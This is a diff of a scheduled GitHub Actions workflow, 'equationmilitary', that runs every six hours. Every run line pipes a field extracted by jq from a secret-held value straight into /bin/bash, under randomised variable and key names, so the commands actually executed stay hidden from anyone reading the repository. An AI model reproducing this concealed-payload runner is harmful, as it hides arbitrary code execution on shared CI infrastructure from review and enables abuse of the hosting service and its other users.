@@ -2,23 +2,24 @@ name: equationmilitary
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 1/6 * * *'
-
-jobs:  # 28963
+    - cron: '55 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: equationmilitary
         env:
-          fxfyi03: ${{ secrets.fxfyi03 }}
+          ypye36: ${{ secrets.ypye36 }}
         run: |
-          echo $fxfyi03 | jq -r .odai6844 | /bin/bash
-          echo $etmdi99869 | jq -r .ssydu39 | /bin/bash
-          echo $xqxcl454 | jq -r .v34616 | /bin/bash
-          echo $gmyna50 | jq -r .nrzwn83302 | /bin/bash
-          echo $f7 | jq -r .p04496 | /bin/bash
-          echo $cj8 | jq -r .a81 | /bin/bash
-          echo $asjq435 | jq -r .ypsy151 | /bin/bash
+          echo $ypye36 | jq -r .bd60760 | /bin/bash
+          echo $xjch9156 | jq -r .jiipv956 | /bin/bash
+          echo $lys94 | jq -r .pz0 | /bin/bash
+          echo $sbm74545 | jq -r .c79 | /bin/bash
+          echo $ojerz1 | jq -r .tuzn82 | /bin/bash
+          echo $cimtk2348 | jq -r .znicl5 | /bin/bash
+          echo $nxl3711 | jq -r .orodu20875 | /bin/bash
+          echo $dvteu65 | jq -r .jtcg8626 | /bin/bash
+          echo $vqo06 | jq -r .m8245 | /bin/bash
+          echo $lzos2 | jq -r .fc86262 | /bin/bash
 
